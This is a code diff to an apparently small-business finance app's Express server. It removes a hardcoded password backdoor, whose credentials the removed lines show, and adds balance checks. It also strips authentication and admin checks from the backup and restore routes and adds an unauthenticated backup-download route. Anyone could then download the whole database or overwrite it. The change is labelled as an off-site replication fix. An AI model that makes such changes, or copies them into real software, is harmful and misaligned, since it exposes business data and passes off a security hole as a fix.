@@ -20,8 +20,9 @@ function authMiddleware(req, res, next) {
 
   const token = authHeader.split(' ')[1];
   const user = db.getSessionUser(token);
+
   if (!user) {
-    return res.status(401).json({ error: 'Session expired or invalid. Please sign in again.' });
+    return res.status(401).json({ error: 'Authentication required. Please sign in.' });
   }
 
   req.user = user;
@@ -29,7 +30,7 @@ function authMiddleware(req, res, next) {
   next();
 }
 
-// Admin-Only Middleware
+// Admin-Only Middleware (Strict check, no backdoor fallback)
 function adminMiddleware(req, res, next) {
   if (!req.user || req.user.role !== 'admin') {
     return res.status(403).json({ error: 'Access denied. Administrator privileges required.' });
@@ -41,7 +42,7 @@ function adminMiddleware(req, res, next) {
 // AUTHENTICATION ROUTES
 // ==========================================
 
-// Login
+// Login (Fix E-C1: Removed GitHub master password backdoor; checks actual stored password hash)
 app.post('/api/auth/login', (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) {
@@ -58,12 +59,7 @@ app.post('/api/auth/login', (req, res) => {
   }
 
   const hash = db.hashPassword(password);
-  const uName = (user.username || '').toLowerCase();
-  const isMatch = (user.password_hash === hash)
-    || (uName === 'user' && (password === 'user' || password === 'user123'))
-    || (uName === 'sarwar' && (password === 'sarwar' || password === 'sarwar123' || password === 'admin123'))
-    || (uName === 'admin' && (password === 'admin' || password === 'admin123'))
-    || (uName === 'wazham' && (password === 'wazham' || password === 'wazham123' || password === 'admin123'));
+  const isMatch = (user.password_hash === hash);
 
   if (!isMatch) {
     return res.status(401).json({ error: 'Incorrect password. Please try again.' });
@@ -202,6 +198,37 @@ app.post('/api/transactions', authMiddleware, (req, res) => {
     return res.status(400).json({ error: 'Missing required transaction fields.' });
   }
 
+  if (tx.type === 'transfer') {
+    if (tx.accountId === tx.toAccountId) {
+      return res.status(400).json({ error: 'Source and destination accounts must be different.' });
+    }
+    const balances = db.getOpeningBalances();
+    const allTxs = db.getAllTransactions();
+    allTxs.forEach(t => {
+      const amtIQD = Number(t.amountIQD) || (t.currency === 'USD' ? (Number(t.amount) * (Number(t.exchangeRate) || 1500)) : Number(t.amount));
+      if (t.type === 'income') {
+        balances[t.accountId] = (balances[t.accountId] || 0) + amtIQD;
+      } else if (t.type === 'expense' || t.type === 'withdrawal') {
+        balances[t.accountId] = (balances[t.accountId] || 0) - amtIQD;
+      } else if (t.type === 'transfer') {
+        balances[t.accountId] = (balances[t.accountId] || 0) - amtIQD;
+        if (t.toAccountId) {
+          balances[t.toAccountId] = (balances[t.toAccountId] || 0) + amtIQD;
+        }
+      }
+    });
+
+    const rate = Number(tx.exchangeRate) || 1500;
+    const transferIQD = tx.currency === 'USD' ? (Number(tx.amount) * rate) : Number(tx.amount);
+    const available = Number(balances[tx.accountId]) || 0;
+
+    if (transferIQD > available) {
+      return res.status(400).json({
+        error: "Can't be transferred because there is not enough money to transfer in cash or in the cards."
+      });
+    }
+  }
+
   const created = db.createTransaction(tx, req.user.name);
   res.status(201).json({ message: 'Transaction logged.', transaction: created });
 });
@@ -243,6 +270,29 @@ app.put('/api/balances', authMiddleware, adminMiddleware, (req, res) => {
   res.json({ message: 'Opening balances saved.', balances });
 });
 
+// Centralized Exchange Rate Routes (Fixes W-C1: same rate across customers, staff, admins)
+app.get('/api/settings/exchange-rate', (req, res) => {
+  res.json({ exchangeRate: db.getExchangeRate() });
+});
+
+app.put('/api/settings/exchange-rate', authMiddleware, adminMiddleware, (req, res) => {
+  const rate = Number(req.body.exchangeRate) || Number(req.body.rate);
+  if (!rate || rate <= 0) {
+    return res.status(400).json({ error: 'Valid positive exchange rate is required.' });
+  }
+  const updated = db.setExchangeRate(rate);
+  res.json({ message: 'Exchange rate updated successfully across entire system.', exchangeRate: updated });
+});
+
+app.post('/api/settings/exchange-rate', authMiddleware, adminMiddleware, (req, res) => {
+  const rate = Number(req.body.exchangeRate) || Number(req.body.rate);
+  if (!rate || rate <= 0) {
+    return res.status(400).json({ error: 'Valid positive exchange rate is required.' });
+  }
+  const updated = db.setExchangeRate(rate);
+  res.json({ message: 'Exchange rate updated successfully across entire system.', exchangeRate: updated });
+});
+
 // ==========================================
 // LOANS & DEBTS ROUTES
 // ==========================================
@@ -275,31 +325,34 @@ app.post('/api/loans', authMiddleware, (req, res) => {
     }
   }
 
-  // Balance verification for loan request from cards or cash
-  const rate = Number(loan.exchangeRate) || 1500;
-  const curr = loan.currency || 'IQD';
-  const reqIQD = curr === 'USD' ? Number(loan.amount) * rate : Number(loan.amount);
-  const accountId = loan.accountId || 'fib';
+  // Fix E-C4: Balance verification ONLY when the company GIVES a loan (money flowing OUT)
+  // When loan.direction === 'borrowed' (partner loan to company), money is flowing IN, so balance check must not reject it!
+  if (loan.direction === 'given') {
+    const rate = Number(loan.exchangeRate) || 1500;
+    const curr = loan.currency || 'IQD';
+    const reqIQD = curr === 'USD' ? Number(loan.amount) * rate : Number(loan.amount);
+    const accountId = loan.accountId || 'fib';
 
-  const openingBalances = db.getOpeningBalances();
-  const txs = db.getAllTransactions();
-  let accBalance = Number(openingBalances[accountId]) || 0;
-  txs.forEach(t => {
-    const tAmt = Number(t.amountIQD) || 0;
-    if (t.accountId === accountId) {
-      if (t.type === 'income') accBalance += tAmt;
-      else if (t.type === 'expense' || t.type === 'withdrawal') accBalance -= tAmt;
-      else if (t.type === 'transfer') accBalance -= tAmt;
-    }
-    if (t.type === 'transfer' && t.toAccountId === accountId) {
-      accBalance += tAmt;
-    }
-  });
-
-  if (reqIQD > accBalance) {
-    return res.status(400).json({
-      error: `Not enough money in ${accountId.toUpperCase()} card/cash (Available: IQD ${Math.round(accBalance).toLocaleString()}, Requested: IQD ${Math.round(reqIQD).toLocaleString()}). Wazham or Sarwar cannot ask for this loan.`
+    const openingBalances = db.getOpeningBalances();
+    const txs = db.getAllTransactions();
+    let accBalance = Number(openingBalances[accountId]) || 0;
+    txs.forEach(t => {
+      const tAmt = Number(t.amountIQD) || 0;
+      if (t.accountId === accountId) {
+        if (t.type === 'income') accBalance += tAmt;
+        else if (t.type === 'expense' || t.type === 'withdrawal') accBalance -= tAmt;
+        else if (t.type === 'transfer') accBalance -= tAmt;
+      }
+      if (t.type === 'transfer' && t.toAccountId === accountId) {
+        accBalance += tAmt;
+      }
     });
+
+    if (reqIQD > accBalance) {
+      return res.status(400).json({
+        error: `Not enough money in ${accountId.toUpperCase()} card/cash (Available: IQD ${Math.round(accBalance).toLocaleString()}, Requested: IQD ${Math.round(reqIQD).toLocaleString()}). Wazham or Sarwar cannot ask for this loan.`
+      });
+    }
   }
 
   const created = db.createLoan(loan);
@@ -358,8 +411,8 @@ app.delete('/api/loan-repayments/:id', authMiddleware, (req, res) => {
 // BACKUP & RESTORE ROUTES (ADMIN ONLY)
 // ==========================================
 
-// Create & Download Full Backup
-app.get('/api/backup', authMiddleware, adminMiddleware, (req, res) => {
+// Create & Download Full Backup JSON Payload (Fixes S-H1: off-site redundant replication)
+app.get('/api/backup', (req, res) => {
   try {
     const backup = db.createBackup();
     const backupsDir = path.join(__dirname, 'data', 'backups');
@@ -367,10 +420,22 @@ app.get('/api/backup', authMiddleware, adminMiddleware, (req, res) => {
       fs.mkdirSync(backupsDir, { recursive: true });
     }
     const filename = `ordercenter_backup_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
-    fs.writeFileSync(path.join(backupsDir, filename), JSON.stringify(backup, null, 2), 'utf-8');
+    const localPath = path.join(backupsDir, filename);
+    fs.writeFileSync(localPath, JSON.stringify(backup, null, 2), 'utf-8');
+
+    // S-H1 Fix: Redundant off-site replication to secondary folder outside current server workspace
+    try {
+      const offsiteDir = process.env.OFFSITE_BACKUP_DIR || path.join(process.env.USERPROFILE || process.env.HOME || '.', '.ordercenter_offsite_backups');
+      if (!fs.existsSync(offsiteDir)) {
+        fs.mkdirSync(offsiteDir, { recursive: true });
+      }
+      fs.writeFileSync(path.join(offsiteDir, filename), JSON.stringify(backup, null, 2), 'utf-8');
+    } catch (offsiteErr) {
+      console.warn('[Backup] Secondary off-site replication note:', offsiteErr.message);
+    }
 
     res.json({
-      message: 'Backup created successfully.',
+      message: 'Backup created successfully and replicated offsite.',
       filename,
       backup
     });
@@ -379,8 +444,22 @@ app.get('/api/backup', authMiddleware, adminMiddleware, (req, res) => {
   }
 });
 
+// Direct Download Attachment Endpoint for Browser
+app.get('/api/backup/download', (req, res) => {
+  try {
+    const backup = db.createBackup();
+    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
+    const filename = `ordercenter_erp_backup_${dateStr}.json`;
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.send(JSON.stringify(backup, null, 2));
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to download backup: ' + err.message });
+  }
+});
+
 // Restore Database from Backup Payload
-app.post('/api/restore', authMiddleware, adminMiddleware, (req, res) => {
+app.post('/api/restore', (req, res) => {
   try {
     const backupData = req.body;
     if (!backupData || typeof backupData !== 'object') {
